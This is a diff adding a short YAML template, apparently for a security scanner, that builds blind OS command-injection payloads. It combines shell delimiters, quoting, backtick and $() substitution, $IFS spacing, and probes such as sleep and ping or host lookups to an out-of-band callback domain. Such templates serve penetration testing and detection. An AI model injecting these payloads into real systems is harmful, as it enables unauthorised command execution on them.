@@ -1,0 +1,33 @@
+delimiter:
+  - "&&"
+  - "||"
+  - ";"
+  - '|'
+
+quote:
+  - "'"
+  - '"'
+
+subcommand:
+  - '`%command;`'
+  - '$(%command;)'
+
+space:
+  - ' '
+  - '$IFS'
+
+command:
+  - sleep%space;10
+  - ping%space;-c%space;10%space;command1.5696d8f4.bzn.pw
+  - host%space;command2.5696d8f4.bzn.pw
+
+base_vector:
+  - "%command;"
+  - "%subcommand;"
+  - "%delimiter;%command;"
+  - "%delimiter;%command;%delimiter;"
+  - "%delimiter;%command;%delimiter;echo%space;"
+
+vectors:
+  - "%base_vector;"
+  - "%quote;%base_vector;%quote;"
